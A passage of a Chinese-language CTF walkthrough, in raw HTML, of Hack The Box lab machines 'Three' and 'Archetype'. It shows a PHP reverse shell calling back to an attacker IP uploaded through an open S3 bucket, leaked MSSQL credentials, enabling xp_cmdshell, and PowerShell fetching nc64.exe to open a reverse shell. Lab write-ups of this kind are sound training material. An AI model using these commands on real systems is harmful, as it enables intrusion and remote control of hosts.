class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 23.96 seconds<br></code></pre></td></tr></table></figure><p>尝试子域名爆破</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(i3eg1nner㉿minilite)-[~]<br>└─$ wfuzz -w /usr/share/amass/wordlists/subdomains-top1mil-5000.txt -u thetoppers.htb -H <span class="hljs-string">&quot;Host:FUZZ.thetoppers.htb&quot;</span> --hw 1036<br> /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz\<span class="hljs-string">&#x27;s documentation for more information.</span><br><span class="hljs-string">********************************************************</span><br><span class="hljs-string">* Wfuzz 3.1.0 - The Web Fuzzer                         *</span><br><span class="hljs-string">********************************************************</span><br><span class="hljs-string"></span><br><span class="hljs-string">Target: http://thetoppers.htb/</span><br><span class="hljs-string">Total requests: 5000</span><br><span class="hljs-string"></span><br><span class="hljs-string">=====================================================================</span><br><span class="hljs-string">ID           Response   Lines    Word       Chars       Payload</span><br><span class="hljs-string">=====================================================================</span><br><span class="hljs-string"></span><br><span class="hljs-string">000000247:   404        0 L      2 W        21 Ch       &quot;s3&quot;</span><br><span class="hljs-string">000000690:   400        10 L     35 W       306 Ch      &quot;gc._msdcs&quot;</span><br><span class="hljs-string">000002700:   400        10 L     35 W       306 Ch      &quot;m.&quot;</span><br><span class="hljs-string">000002795:   400        10 L     35 W       306 Ch      &quot;ns2.cl.bellsouth.net.&quot;</span><br><span class="hljs-string">000002883:   400        10 L     35 W       306 Ch      &quot;ns1.viviotech.net.&quot;</span><br><span class="hljs-string">000002885:   400        10 L     35 W       306 Ch      &quot;ns2.viviotech.net.&quot;</span><br><span class="hljs-string">000003050:   400        10 L     35 W       306 Ch      &quot;ns3.cl.bellsouth.net.&quot;</span><br><span class="hljs-string">^C /usr/lib/python3/dist-packages/wfuzz/wfuzz.py:80: UserWarning:Finishing pending requests...</span><br><span class="hljs-string"></span><br><span class="hljs-string">Total time: 0</span><br><span class="hljs-string">Processed Requests: 3066</span><br><span class="hljs-string">Filtered Requests: 3059</span><br><span class="hljs-string">Requests/sec.: 0</span><br><span class="hljs-string"></span><br></code></pre></td></tr></table></figure><p>得到一个 s3 的子域名，虽然返回的是 404，但是也应当引起注意，借助于谷歌搜索发现，s3 是亚马逊的存储服务，然后把 s3.thetoppers.htb 和 IP 的对应也写入 hosts 文件。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(i3eg1nner㉿minilite)-[~]<br>└─$ curl s3.thetoppers.htb<br>&#123;<span class="hljs-string">&quot;status&quot;</span>: <span class="hljs-string">&quot;running&quot;</span>&#125;<br></code></pre></td></tr></table></figure><p>接下来我们需要借助于工具 awscli 来和 s3.thetoppers.htb 进行交互。通过 apt-get 安装完 awscli（或者 aws）之后首先应当使用 aws configure 进行参数的配置（随便写就行），这样我们才能和目标进行交互。</p><p>使用 <code>aws --endpoint=http://s3.thetoppers.htb s3 ls s3://thetoppers.htb </code> 来列出所有的存储对象</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(i3eg1nner㉿minilite)-[~]<br>└─$ aws s3 <span class="hljs-built_in">cp</span> <span class="hljs-built_in">hash</span> s3://s3.thetoppers.htb/<br>upload failed: ./hash to s3://s3.thetoppers.htb/hash Could not connect to the endpoint URL: <span class="hljs-string">&quot;https://s3.temp.amazonaws.com/s3.thetoppers.htb/hash&quot;</span><br><br>┌──(i3eg1nner㉿minilite)-[~]<br>└─$ aws --endpoint=http://s3.thetoppers.htb s3 <span class="hljs-built_in">ls</span>  s3://thetoppers.htb<br>                           PRE images/<br>2023-06-01 22:17:08          0 .htaccess<br>2023-06-01 22:17:08      11952 index.php<br></code></pre></td></tr></table></figure><p>既然如此，接下来我们就使用 cp 命令借助于 aws s3 的机制来实现文件上传。一开始上传了这样的反向 shell</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">exec</span>(<span class="hljs-string">&quot;/bin/bash -c &#x27;bash -i &gt;&amp; /dev/tcp/10.10.10.128/1234 0&gt;&amp;1&#x27;&quot;</span>); <span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>但是出现了问题：连接上之后就立马断开了，再尝试尝试经典的 php 反向 shell 吧</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(i3eg1nner㉿minilite)-[~]<br>└─$ <span class="hljs-built_in">cp</span> /usr/share/webshells/php/php-reverse-shell.php ./<br><br>┌──(i3eg1nner㉿minilite)-[~]<br>└─$ vim  php-reverse-shell.php<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(i3eg1nner㉿minilite)-[~]<br>└─$ aws --endpoint=http://s3.thetoppers.htb s3 <span class="hljs-built_in">cp</span> php-reverse-shell.php s3://thetoppers.htb<br>upload: ./php-reverse-shell.php to s3://thetoppers.htb/php-reverse-shell.php<br><br>┌──(i3eg1nner㉿minilite)-[~]<br>└─$ aws --endpoint=http://s3.thetoppers.htb s3 <span class="hljs-built_in">ls</span> s3://thetoppers.htb<br>                           PRE images/<br>2023-06-01 22:17:08          0 .htaccess<br>2023-06-01 22:17:08      11952 index.php<br>2023-06-01 23:32:09       5494 php-reverse-shell.php<br>2023-06-01 23:19:09         31 shell.php<br>2023-06-01 23:27:06         80 shellre.php<br></code></pre></td></tr></table></figure><p>通过 curl 去访问，反弹 shell 成功，后面就进行简单的信息收集，在 www 目录下发现了flag.txt</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(i3eg1nner㉿minilite)-[~]<br>└─$ sudo nc -lvnp 1234<br>listening on [any] 1234 ...<br>connect to [10.10.14.109] from (UNKNOWN) [10.129.227.248] 38080<br>Linux three 4.15.0-189-generic <span class="hljs-comment">#200-Ubuntu SMP Wed Jun 22 19:53:37 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux</span><br> 03:32:52 up  1:33,  0 <span class="hljs-built_in">users</span>,  load average: 0.00, 0.00, 0.05<br>USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT<br>uid=33(www-data) gid=33(www-data) <span class="hljs-built_in">groups</span>=33(www-data)<br>/bin/sh: 0: can\<span class="hljs-string">&#x27;t access tty; job control turned off</span><br><span class="hljs-string">$ whoami</span><br><span class="hljs-string">www-data</span><br><span class="hljs-string">$ id</span><br><span class="hljs-string">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span><br><span class="hljs-string">$ python -c &quot;import pty;pty.spawn(&#x27;</span>/bin/bash<span class="hljs-string">&#x27;)&quot;</span><br><span class="hljs-string">www-data@three:/$ uname -a</span><br><span class="hljs-string">uname -a</span><br><span class="hljs-string">Linux three 4.15.0-189-generic #200-Ubuntu SMP Wed Jun 22 19:53:37 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux</span><br><span class="hljs-string">www-data@three:/$ ip a</span><br><span class="hljs-string">ip a</span><br><span class="hljs-string">1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000</span><br><span class="hljs-string">    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00</span><br><span class="hljs-string">    inet 127.0.0.1/8 scope host lo</span><br><span class="hljs-string">       valid_lft forever preferred_lft forever</span><br><span class="hljs-string">    inet6 ::1/128 scope host</span><br><span class="hljs-string">       valid_lft forever preferred_lft forever</span><br><span class="hljs-string">2: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc mq state UP group default qlen 1000</span><br><span class="hljs-string">    link/ether 00:50:56:b9:ac:02 brd ff:ff:ff:ff:ff:ff</span><br><span class="hljs-string">    inet 10.129.227.248/16 brd 10.129.255.255 scope global eth0</span><br><span class="hljs-string">       valid_lft forever preferred_lft forever</span><br><span class="hljs-string">    inet6 dead:beef::250:56ff:feb9:ac02/64 scope global dynamic mngtmpaddr</span><br><span class="hljs-string">       valid_lft 86391sec preferred_lft 14391sec</span><br><span class="hljs-string">    inet6 fe80::250:56ff:feb9:ac02/64 scope link</span><br><span class="hljs-string">       valid_lft forever preferred_lft forever</span><br><span class="hljs-string">3: docker0: &lt;NO-CARRIER,BROADCAST,MULTICAST,UP&gt; mtu 1500 qdisc noqueue state DOWN group default</span><br><span class="hljs-string">    link/ether 02:42:2d:2f:a4:be brd ff:ff:ff:ff:ff:ff</span><br><span class="hljs-string">    inet 172.17.0.1/16 brd 172.17.255.255 scope global docker0</span><br><span class="hljs-string">       valid_lft forever preferred_lft forever</span><br><span class="hljs-string">4: br-2de548fc06bf: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue state UP group default</span><br><span class="hljs-string">    link/ether 02:42:f6:13:a4:fd brd ff:ff:ff:ff:ff:ff</span><br><span class="hljs-string">    inet 172.18.0.1/16 brd 172.18.255.255 scope global br-2de548fc06bf</span><br><span class="hljs-string">       valid_lft forever preferred_lft forever</span><br><span class="hljs-string">    inet6 fe80::42:f6ff:fe13:a4fd/64 scope link</span><br><span class="hljs-string">       valid_lft forever preferred_lft forever</span><br><span class="hljs-string">6: veth1c9ddaf@if5: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue master br-2de548fc06bf state UP group default</span><br><span class="hljs-string">    link/ether 8e:19:6f:3f:9d:5f brd ff:ff:ff:ff:ff:ff link-netnsid 0</span><br><span class="hljs-string">    inet6 fe80::8c19:6fff:fe3f:9d5f/64 scope link</span><br><span class="hljs-string">       valid_lft forever preferred_lft forever</span><br><span class="hljs-string">www-data@three:/$ pwd</span><br><span class="hljs-string">pwd</span><br><span class="hljs-string">/</span><br><span class="hljs-string">www-data@three:/$ ls</span><br><span class="hljs-string">ls</span><br><span class="hljs-string">bin   etc         initrd.img.old  lost+found  opt   run   sys  var</span><br><span class="hljs-string">boot  home        lib             media       proc  sbin  tmp  vmlinuz</span><br><span class="hljs-string">dev   initrd.img  lib64           mnt         root  srv   usr  vmlinuz.old</span><br><span class="hljs-string">www-data@three:/$ cd /root</span><br><span class="hljs-string">cd /root</span><br><span class="hljs-string">bash: cd: /root: Permission denied</span><br><span class="hljs-string">www-data@three:/$ cat /etc/crontab</span><br><span class="hljs-string">cat /etc/crontab</span><br><span class="hljs-string"># /etc/crontab: system-wide crontab</span><br><span class="hljs-string"># Unlike any other crontab you don&#x27;</span>t have to run the `crontab<span class="hljs-string">&#x27;</span><br><span class="hljs-string"># command to install the new version when you edit this file</span><br><span class="hljs-string"># and files in /etc/cron.d. These files also have username fields,</span><br><span class="hljs-string"># that none of the other crontabs do.</span><br><span class="hljs-string"></span><br><span class="hljs-string">SHELL=/bin/sh</span><br><span class="hljs-string">PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin</span><br><span class="hljs-string"></span><br><span class="hljs-string"># m h dom mon dow user  command</span><br><span class="hljs-string">17 *    * * *   root    cd / &amp;&amp; run-parts --report /etc/cron.hourly</span><br><span class="hljs-string">25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.daily )</span><br><span class="hljs-string">47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.weekly )</span><br><span class="hljs-string">52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.monthly )</span><br><span class="hljs-string">#</span><br><span class="hljs-string">www-data@three:/$ cd /var/www</span><br><span class="hljs-string">cd /var/www</span><br><span class="hljs-string">www-data@three:/var/www$ ls</span><br><span class="hljs-string">ls</span><br><span class="hljs-string">flag.txt  html</span><br><span class="hljs-string">www-data@three:/var/www$ cat flag.txt</span><br><span class="hljs-string">cat flag.txt</span><br><span class="hljs-string">a980d99281a28d638ac68b9bf9453c2b</span><br></code></pre></td></tr></table></figure><h2 id="Archetype"><a href="#Archetype" class="headerlink" title="Archetype"></a>Archetype</h2><h3 id="信息收集-1"><a href="#信息收集-1" class="headerlink" title="信息收集"></a>信息收集</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(i3eg1nner㉿minilite)-[~]<br>└─$ sudo nmap --min-rate 10000 -p- 10.129.142.66<br>[sudo] password <span class="hljs-keyword">for</span> i3eg1nner:<br>Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-02 04:06 EDT<br>Warning: 10.129.142.66 giving up on port because retransmission <span class="hljs-built_in">cap</span> hit (10).<br>Nmap scan report <span class="hljs-keyword">for</span> 10.129.142.66<br>Host is up (0.031s latency).<br>Not shown: 65135 closed tcp ports (reset), 388 filtered tcp ports (no-response)<br>PORT      STATE SERVICE<br>135/tcp   open  msrpc<br>139/tcp   open  netbios-ssn<br>445/tcp   open  microsoft-ds<br>1433/tcp  open  ms-sql-s<br>5985/tcp  open  wsman<br>47001/tcp open  winrm<br>49664/tcp open  unknown<br>49665/tcp open  unknown<br>49666/tcp open  unknown<br>49667/tcp open  unknown<br>49668/tcp open  unknown<br>49669/tcp open  unknown<br><br></code></pre></td></tr></table></figure><h3 id="smb-信息收集"><a href="#smb-信息收集" class="headerlink" title="smb 信息收集"></a>smb 信息收集</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(i3eg1nner㉿minilite)-[~]<br>└─$ sudo nmap --script=smb-enum-shares.nse,smb-enum-users.nse 10.129.142.66<br>Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-02 04:09 EDT<br>Nmap scan report <span class="hljs-keyword">for</span> 10.129.142.66<br>Host is up (0.0094s latency).<br>Not shown: 996 closed tcp ports (reset)<br>PORT     STATE SERVICE<br>135/tcp  open  msrpc<br>139/tcp  open  netbios-ssn<br>445/tcp  open  microsoft-ds<br>1433/tcp open  ms-sql-s<br><br>Host script results:<br>| smb-enum-shares:<br>|   account_used: guest<br>|   \\10.129.142.66\ADMIN$:<br>|     Type: STYPE_DISKTREE_HIDDEN<br>|     Comment: Remote Admin<br>|     Anonymous access: &lt;none&gt;<br>|     Current user access: &lt;none&gt;<br>|   \\10.129.142.66\C$:<br>|     Type: STYPE_DISKTREE_HIDDEN<br>|     Comment: Default share<br>|     Anonymous access: &lt;none&gt;<br>|     Current user access: &lt;none&gt;<br>|   \\10.129.142.66\IPC$:<br>|     Type: STYPE_IPC_HIDDEN<br>|     Comment: Remote IPC<br>|     Anonymous access: READ/WRITE<br>|     Current user access: READ/WRITE<br>|   \\10.129.142.66\backups:<br>|     Type: STYPE_DISKTREE<br>|     Comment:<br>|     Anonymous access: READ<br>|_    Current user access: READ<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 28.35 seconds<br></code></pre></td></tr></table></figure><h3 id="smb-登录"><a href="#smb-登录" class="headerlink" title="smb 登录"></a>smb 登录</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(i3eg1nner㉿minilite)-[~]<br>└─$ smbclient //10.129.142.66/backups<br>Password <span class="hljs-keyword">for</span> [WORKGROUP\i3eg1nner]:<br>Try <span class="hljs-string">&quot;help&quot;</span> to get a list of possible commands.<br>smb: \&gt; <span class="hljs-built_in">ls</span><br>  .                                   D        0  Mon Jan 20 07:20:57 2020<br>  ..                                  D        0  Mon Jan 20 07:20:57 2020<br>  prod.dtsConfig                     AR      609  Mon Jan 20 07:23:02 2020<br><br>                5056511 blocks of size 4096. 2609591 blocks available<br>smb: \&gt; <span class="hljs-built_in">help</span><br>?              allinfo        altname        archive        backup<br>blocksize      cancel         case_sensitive <span class="hljs-built_in">cd</span>             <span class="hljs-built_in">chmod</span><br><span class="hljs-built_in">chown</span>          close          del            deltree        <span class="hljs-built_in">dir</span><br><span class="hljs-built_in">du</span>             <span class="hljs-built_in">echo</span>           <span class="hljs-built_in">exit</span>           get            getfacl<br>geteas         hardlink       <span class="hljs-built_in">help</span>           <span class="hljs-built_in">history</span>        iosize<br>lcd            <span class="hljs-built_in">link</span>           lock           lowercase      <span class="hljs-built_in">ls</span><br>l              mask           md             mget           <span class="hljs-built_in">mkdir</span><br>more           mput           newer          notify         open<br>posix          posix_encrypt  posix_open     posix_mkdir    posix_rmdir<br>posix_unlink   posix_whoami   <span class="hljs-built_in">print</span>          prompt         put<br><span class="hljs-built_in">pwd</span>            q              queue          quit           <span class="hljs-built_in">readlink</span><br>rd             recurse        reget          rename         reput<br><span class="hljs-built_in">rm</span>             <span class="hljs-built_in">rmdir</span>          showacls       setea          setmode<br>scopy          <span class="hljs-built_in">stat</span>           symlink        tar            tarmode<br><span class="hljs-built_in">timeout</span>        translate      unlock         volume         vuid<br>wdel           logon          listconnect    showconnect    tcon<br>tdis           tid            utimes         logoff         ..<br>!<br>smb: \&gt; get prod.dtsConfig<br>getting file \prod.dtsConfig of size 609 as prod.dtsConfig (35.0 KiloBytes/sec) (average 35.0 KiloBytes/sec)<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(i3eg1nner㉿minilite)-[~]<br>└─$ <span class="hljs-built_in">cat</span> prod.dtsConfig<br>&lt;DTSConfiguration&gt;<br>    &lt;DTSConfigurationHeading&gt;<br>        &lt;DTSConfigurationFileInfo GeneratedBy=<span class="hljs-string">&quot;...&quot;</span> GeneratedFromPackageName=<span class="hljs-string">&quot;...&quot;</span> GeneratedFromPackageID=<span class="hljs-string">&quot;...&quot;</span> GeneratedDate=<span class="hljs-string">&quot;20.1.2019 10:01:34&quot;</span>/&gt;<br>    &lt;/DTSConfigurationHeading&gt;<br>    &lt;Configuration ConfiguredType=<span class="hljs-string">&quot;Property&quot;</span> Path=<span class="hljs-string">&quot;\Package.Connections[Destination].Properties[ConnectionString]&quot;</span> ValueType=<span class="hljs-string">&quot;String&quot;</span>&gt;<br>        &lt;ConfiguredValue&gt;Data Source=.;Password=M3g4c0rp123;User ID=ARCHETYPE\sql_svc;Initial Catalog=Catalog;Provider=SQLNCLI10.1;Persist Security Info=True;Auto Translate=False;&lt;/ConfiguredValue&gt;<br>    &lt;/Configuration&gt;<br>&lt;/DTSConfiguration&gt;<br></code></pre></td></tr></table></figure><h3 id="mssql-渗透"><a href="#mssql-渗透" class="headerlink" title="mssql 渗透"></a>mssql 渗透</h3><p>发现了用户名和密码，并且用户名中有 sql 关键字，而端口扫描的结果显示，靶机开启了 mssql。因此尝试登录，使用的工具是<code>impacket-mssqlclient</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(i3eg1nner㉿minilite)-[~]<br>└─$ impacket-mssqlclient -windows-auth sql_svc@10.129.142.66<br>Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation<br><br>Password:<br>[*] Encryption required, switching to TLS<br>[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master<br>[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english<br>[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192<br>[*] INFO(ARCHETYPE): Line 1: Changed database context to <span class="hljs-string">&#x27;master&#x27;</span>.<br>[*] INFO(ARCHETYPE): Line 1: Changed language setting to us_english.<br>[*] ACK: Result: 1 - Microsoft SQL Server (140 3232)<br>[!] Press <span class="hljs-built_in">help</span> <span class="hljs-keyword">for</span> extra shell commands<br>SQL&gt; <span class="hljs-built_in">help</span><br><br>     lcd &#123;path&#125;                 - changes the current <span class="hljs-built_in">local</span> directory to &#123;path&#125;<br>     <span class="hljs-built_in">exit</span>                       - terminates the server process (and this session)<br>     enable_xp_cmdshell         - you know what it means<br>     disable_xp_cmdshell        - you know what it means<br>     xp_cmdshell &#123;cmd&#125;          - executes cmd using xp_cmdshell<br>     sp_start_job &#123;cmd&#125;         - executes cmd using the sql server agent (blind)<br>     ! &#123;cmd&#125;                    - executes a <span class="hljs-built_in">local</span> shell cmd<br></code></pre></td></tr></table></figure><p>使用以下命令进行判断</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">SELECT is_srvrolemember(<span class="hljs-string">&#x27;sysadmin&#x27;</span>);<br></code></pre></td></tr></table></figure><p>发现确实有权限，那接下来要获取命令执行的权限</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">EXEC xp_cmdshell <span class="hljs-string">&#x27;net user&#x27;</span>; — privOn MSSQL 2005 you may need to reactivate xp_cmdshell first as it’s disabled by default: <br>EXEC sp_configure <span class="hljs-string">&#x27;show advanced options&#x27;</span>, 1; — priv <br>RECONFIGURE; — priv <br>EXEC sp_configure <span class="hljs-string">&#x27;xp_cmdshell&#x27;</span>, 1; — priv <br>RECONFIGURE; — priv<br></code></pre></td></tr></table></figure><p>也可以使用工具中自带的功能，它会给出一定的指引</p><p><img src="/pic/3ead4281f5a07e1e757b00331112c7e5_MD5.png"></p><p>接下来我们就可以使用 xp_cmdshell 来执行命令了，我们开始考虑如何反弹 shell，首先在机器上上传 nc.exe 文件，然后利用 nc 反弹 shell。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">SQL&gt; xp_cmdshell <span class="hljs-string">&quot;powershell -c cd C:\Users\sql_svc\Downloads; wget http://10.10.14.9/nc64.exe -outfile nc64.exe&quot;</span><br>SQL&gt; xp_cmdshell <span class="hljs-string">&quot;powershell -c cd C:\Users\sql_svc\Downloads; .\nc64.exe -e cmd.exe 10.10.14.9 443</span><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(i3eg1nner㉿minilite)-[/usr/share/windows-resources/binaries]<br>└─$ sudo nc -lvnp 443<br>listening on [any] 443 ...<br>connect to [10.10.14.109] from (UNKNOWN) [10.129.142.66] 49677<br>Microsoft Windows [Version 10.0.17763.2061]<br>(c) 2018 Microsoft Corporation. All rights reserved.<br><br>C:\Users\sql_svc\Downloads&gt;<span class="hljs-built_in">dir</span><br><span class="hljs-built_in">dir</span><br> Volume <span class="hljs-keyword">in</span> drive C has no label.<br> Volume Serial Number is 9565-0B4F<br><br> Directory of C:\Users\sql_svc\Downloads<br><br>06/02/2023  01:48 AM    &lt;DIR&gt;          .<br>06/02/2023  01:48 AM    &lt;DIR&gt;          ..<br>06/02/2023  01:45 AM            59,392 nc.exe<br>06/02/2023  01:48 AM            59,392 nc64.exe<br>               2 File(s)        118,784 bytes<br>               2 Dir(s)  10,717,417,472 bytes free<br><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span 